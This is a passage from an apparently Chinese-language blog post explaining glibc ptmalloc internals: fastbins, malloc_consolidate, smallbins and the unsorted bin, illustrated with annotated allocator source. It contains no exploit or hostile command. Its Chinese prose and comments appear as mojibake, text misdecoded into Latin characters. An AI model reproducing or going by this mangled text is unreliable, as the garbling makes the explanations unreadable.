å¡æ»¡äº†,è¦ä¹ˆæ˜¯fastbinä¸€æ»´ä¹Ÿä¸å‰©äº†</span></span><br><span class="line">                    <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(tc_victim)))</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = REVEAL_PTR(tc_victim-&gt;fd);									</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put(tc_victim, tc_idx);<span class="comment">//å†å¡ä¸€ä¸ª</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h5><p>ç”±äºfastbinsä¸­çš„å †å—ä¸ä¼šè¢«åˆå¹¶,å¤„äºä¸€ç§ä¸å½»åº•é‡Šæ”¾çš„çŠ¶æ€,å¯èƒ½å¯¼è‡´å¤–éƒ¨ç¢ç‰‡å¢åŠ ,æ¯”å¦‚å‡è®¾æŸä¸€æ—¶åˆ»å †å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[64B @ smallbins][16B @ fastbins][64B @ smallbins]</span><br></pre></td></tr></table></figure>

<p>æ€»è®¡æœ‰<code>144B</code>çš„ç©ºé—²å†…å­˜ç©ºé—´</p>
<p>å¯¹äºä¸€ä¸ª<code>128B</code>çš„è¯·æ±‚, å´å› ä¸ºä¸­é—´<code>fastbins</code>ä¸­çš„å †å—ä¸èƒ½è¢«åˆå¹¶,è€Œå¾—ä¸åˆ°æ»¡è¶³</p>
<p>å› æ­¤<code>malloc_consolidate</code>å‡½æ•°çš„èŒè´£,å°±æ˜¯é€‚æ—¶æ¸…ç†<code>fastbins</code>,å°è¯•åˆå¹¶å‡ºå¤§è¥¿ç“œæ¥,å‡å°‘å¤–éƒ¨ç¢ç‰‡</p>
<blockquote>
<p>å¤–éƒ¨ç¢ç‰‡:</p>
<p>å¤šæ¬¡æ— è§„å¾‹çš„åˆ†é…ä¸é‡Šæ”¾ä¹‹åå †å†…å­˜ä¸­å‡ºç°å¾ˆå¤šå°ç©ºæ´,</p>
<p>å°ç©ºæ´å¯èƒ½åŠ èµ·æ¥æœ‰è¾ƒå¤§çš„ç©ºé—´,ä½†æ˜¯å®é™…ä¸Šä¸è¿ç»­,ä¸èƒ½æ»¡è¶³ä¸€ä¸ªçœŸæ­£çš„å¤§ç©ºé—´ç”³è¯·</p>
<p>å†…éƒ¨ç¢ç‰‡:</p>
<p>å› ä¸ºå…ƒæ•°æ®ä»¥åŠå¯¹é½å› ç´ ,å¯¼è‡´å †å—å®é™…å¤§å°å¤§äºæ‰€éœ€å¤§å°æ‰€é€ æˆçš„å†…å­˜æµªè´¹</p>
</blockquote>
<p><strong>malloc_consolidateå‘ç”Ÿæ—¶æœº</strong></p>
<p><code>malloc_consolidate</code>ç”¨äºæ¸…æ‰«<code>fastbins</code>ä¸­çš„é»‘æˆ·</p>
<p>å¯èƒ½å‘ç”Ÿçš„æ—¶æœº:</p>
<p>1.<code>malloc</code>è¯·æ±‚ä¸èƒ½åœ¨<code>tcache,fastbins,smallbins</code>ä¸­å¾—åˆ°æ»¡è¶³,å¹¶ä¸”æ­¤æ—¶<code>fastbins</code>ä¸­è‡³å°‘æœ‰ä¸€ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))		<span class="comment">//å½“fastbinä¸­ä¸€æ—¦æœ‰å †å—,av-&gt;have_fastchunkså°±ä¼šè¢«ç½®ä½</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>2.å½“ä½¿ç”¨<code>topchunk</code>è¿›è¡Œåˆ†é…<strong>ä»æ— æ³•æ»¡è¶³</strong>æ—¶,è€ƒè™‘åˆ°<code>fastbins</code>ä¸­çš„å †å—å¯èƒ½åˆå¹¶åˆ°<code>topchunk</code>,ä»¥æ‰©å¤§<code>topchunk</code>,å¯èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚,å› æ­¤æ­¤æ—¶ä¹Ÿä¼šå°è¯•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">	...<span class="comment">//ä½¿ç”¨topchunkå¯ä»¥æ»¡è¶³éœ€æ±‚</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line"><span class="comment">//topchunkæ— æ³•ç›´æ¥æ»¡è¶³éœ€æ±‚,å°è¯•å°†fastbinsä¸­çš„é»‘æˆ·åˆå¹¶åˆ°topchunk,åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯æ—¶é‡æ–°å°è¯•ä½¿ç”¨topchunkåˆ†é…</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      &#123;</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">          idx = smallbin_index (nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          idx = largebin_index (nb);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//åˆ°æ­¤è¯´æ˜fastbinså·²ç»å…¨æ€äº†,å¦‚æœè¿˜ä¸èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚,è¯´æ˜ptmallocå·²ç»æ‰è¥Ÿè§è‚˜äº†,éœ€è¦ç³»ç»Ÿè°ƒç”¨brk,ç»™å †åŒºæ‰©å®¹äº†</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>3.åœ¨<code>free</code>æ—¶å¦‚æœé‡Šæ”¾çš„å †å—éå¸¸å¤§,å¤§äº<code>65536</code>ä¸ªå­—èŠ‚,ä¹Ÿå°±æ˜¯<code>64KB</code>,å¹¶ä¸”æ­¤æ—¶<code>fastbins</code>ä¸­æœ‰ä¸œè¥¿,ä¹Ÿä¼šå‘ç”Ÿ,ç›®çš„æ˜¯æŠŠ<code>fastbins</code>ä¸­çš„é»‘æˆ·æ€äº†,èƒ½åˆå¹¶åˆ°è¿™ä¸ªå¤§å—å„¿çš„å°±åˆå¹¶,ç„¶åè°ƒç”¨<code>munmap</code>ç¼©å‡å †åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>4.<code>malloc_trim</code>è¢«è°ƒç”¨æ—¶,å­å‡½æ•°<code>mtrim</code>ä¼šè¿›è¡Œ<code>malloc_consolidate</code>,è¿™ä¸ª<code>malloc_trim</code>ä½œç”¨æ˜¯å‰Šå‡å †åŒºç©ºé—´è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿ</p>
<blockquote>
<p>ç„¶è€Œåœ¨glibcä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°è¯¥å‡½æ•°çš„è°ƒç”¨è€…,å¯èƒ½æ˜¯æä¾›ç»™å¼€å‘è€…æ‰‹åŠ¨ç®¡ç†å†…å­˜ç”¨çš„</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">mtrim (mstate av, size_t pad)</span><br><span class="line">&#123;</span><br><span class="line">  /* Ensure all blocks are consolidated.  */</span><br><span class="line">  malloc_consolidate (av);</span><br></pre></td></tr></table></figure>

<p><strong>malloc_consolidateçš„æ•ˆæœ</strong></p>
<p>é›¶å¸§èµ·æ‰‹,ç›´æ¥å®£åˆ¤<code>fastbins</code>ä¸­çš„å †å—æ­»åˆ‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>æ„æ€æ˜¯æœ¬å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹å,<code>fastbins</code>ä¸­å°†æ— äººç”Ÿè¿˜</p>
<p>å…·ä½“å¹²äº†å•¥å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ä»å°åˆ°å¤§éå†fastbinsä¸­çš„10ä¸ªæ¡¶å­,å¯¹äºæ¯ä¸ªæ¡¶å­:</span><br><span class="line">	å¦‚æœæ¡¶å­ä¸ºç©ºåˆ™continue</span><br><span class="line">	å¦‚æœæ¡¶å­ä¸ç©º:</span><br><span class="line">		éå†è¯¥æ¡¶å­ä¸ŠæŒ‚çš„æ¯ä¸ªå †å—,å¯¹äºæ¯ä¸ªå †å—:</span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„å‰å—ç©ºé—² åˆ™:</span><br><span class="line">				å‘å‰åˆå¹¶,å¹¶å°†å‰å—ä»å…¶æ‰€åœ¨binä¸­unlinkæ‹†ä¸‹æ¥</span><br><span class="line"></span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„åå—ä¸æ˜¯topchunk åˆ™:</span><br><span class="line">				å¦‚æœè¯¥åå—ç©ºé—² åˆ™:</span><br><span class="line">					æŠŠåå—ä»å…¶æ‰€åœ¨binä¸­unlinkæ‹†ä¸‹æ¥,</span><br><span class="line">					å½“å‰å—å‘ååˆå¹¶</span><br><span class="line">				å¦‚æœåå—æ­£åœ¨ä½¿ç”¨ åˆ™:</span><br><span class="line">					åå—çš„Pæ ‡å¿—å½’é›¶</span><br><span class="line">				æŒ‚åˆ°unsortedbinä¸Š</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„åå—æ˜¯topchunk åˆ™:</span><br><span class="line">				åˆå¹¶åˆ°topchunk</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin(av, <span class="number">0</span>);   <span class="comment">//è¿­ä»£éå†fastbinsä¸­çš„æ¯ä¸ªæ¡¶å­,ä»ç¬¬0ä¸ªæ¡¶å­å¼€å§‹,åˆ°æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;       <span class="comment">//ä»å°åˆ°å¤§éå†fastbinsä¸­çš„10ä¸ªæ¡¶å­</span></span><br><span class="line">    p = atomic_exchange_acq(fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>)     <span class="comment">//æ¡¶å­éç©º</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(p)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">                                    <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(chunksize(p));</span><br><span class="line">                <span class="keyword">if</span> ((&amp;fastbin(av, idx)) != fb)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_inuse_chunk(av, p);</span><br><span class="line">            nextp = REVEAL_PTR(p-&gt;fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">            size = chunksize(p);</span><br><span class="line">            nextchunk = chunk_at_offset(p, size);</span><br><span class="line">            nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">//å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">            &#123;</span><br><span class="line">                prevsize = prev_size(p);</span><br><span class="line">                size += prevsize;</span><br><span class="line">                p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">                unlink_chunk(av, p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">            &#123;</span><br><span class="line">                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">                &#123;</span><br><span class="line">                    size += nextsize;</span><br><span class="line">                    unlink_chunk(av, nextchunk);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                first_unsorted = unsorted_bin-&gt;fd;  <span class="comment">//æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">                unsorted_bin-&gt;fd = p;</span><br><span class="line">                first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                p-&gt;bk = unsorted_bin;</span><br><span class="line">                p-&gt;fd = first_unsorted;</span><br><span class="line">                set_foot(p, size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">//åˆå¹¶åˆ°topchunk</span></span><br><span class="line">            &#123;</span><br><span class="line">                size += nextsize;</span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                av-&gt;top = p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="å°æ–ŒSmallbins"><a href="#å°æ–ŒSmallbins" class="headerlink" title="å°æ–ŒSmallbins"></a>å°æ–ŒSmallbins</h3><p><code>bin_at(M,2~63)</code>è¿™ä¸ªèŒƒå›´æ˜¯å°æ–Œ</p>
<h4 id="datastructure-1"><a href="#datastructure-1" class="headerlink" title="datastructure"></a>datastructure</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213732598.png" alt="image-20241026213732598"></p>
<p>å¸¦é™„åŠ å¤´èŠ‚ç‚¹çš„åŒå‘å¾ªç¯é“¾è¡¨</p>
<p>æ¡¶å­å¤´åˆ°å †å—çš„æŒ‡é’ˆæ˜¯è£¸éœ²çš„</p>
<p>å †å—ä¹‹é—´çš„æŒ‡é’ˆæ˜¯åŠ äº†å¯†çš„,çœŸæ˜¯åŠ äº†ç§æƒ</p>
<h4 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h4><p>å°æ–Œå¯èƒ½å»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.ä½¿ç”¨<code>malloc</code>æ—¶,å¦‚æœè½®åˆ°ä¹±æ–Œå‡ºåŠ›,å¦‚æœä¹±æ–Œå‘ç°è‡ªå·±ç®¡ç†çš„å †å—å®é™…ä¸Šæ˜¯å°æ–Œçš„èŒƒå›´,ä¹±æ–Œä¼šæ‰”ç»™å°æ–Œ</p>
<h5 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)					<span class="comment">//è‡³å°‘æœ‰ä¸€å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))        <span class="comment">//ç±»fastbinæ£€æŸ¥DFçš„å”æ°æ–¹æ³•</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE              <span class="comment">//ç±»ä¼¼äºfastbinä½¿ç”¨tcacheç¼“å†²çš„æ–¹æ³•</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å¦‚æœä¸è€ƒè™‘tcache,é‚£ä¹ˆç›¸åº”ä¸€æ¬¡mallocè¯·æ±‚ä¹‹å,smallbiné•¿è¿™æ ·:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213926914.png" alt="image-20241026213926914"></p>
<h3 id="ä¹±æ–ŒUnsortedbin"><a href="#ä¹±æ–ŒUnsortedbin" class="headerlink" title="ä¹±æ–ŒUnsortedbin"></a>ä¹±æ–ŒUnsortedbin</h3><h4 id="algorithm-3"><a href="#algorithm-3" class="headerlink" title="algorithm"></a>algorithm</h4><p>ä¹±æ–Œæ˜¯æ–Œå®¶çš„è¿›å£éƒ¨é•¿,å¤§æ–Œå’Œå°æ–Œçš„è´§,éƒ½æ˜¯ä¹±æ–Œç»™çš„</p>
<p>ä¹±æ–Œå¯èƒ½ä»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.å½“<code>fastbins</code>ä¸­è§¦å‘äº†<code>malloc_consolidate</code>ä¹‹å,å¦‚æœå †å—æ²¡æœ‰è¢«åˆå¹¶åˆ°<code>topchunk</code> ,é‚£ä¹ˆå…¶å½’å®¿å°±æ˜¯<code>unsortedbin</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">...</span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>2.åœ¨<code>free</code>æ—¶,å¦‚æœå †å—ä¸æ˜¯<code>mmap</code>çš„,å¹¶ä¸”<code>tcache</code>,<code>fastbins</code>éƒ½æ²¡èƒ½ç•™ä½å †å—,å¹¶ä¸”å †å—æ²¡æœ‰è¢«åˆå¹¶åˆ°<code>topchunk</code>,é‚£ä¹ˆå…¶å½’å®¿å°±æ˜¯<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))         <span class="comment">//å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span 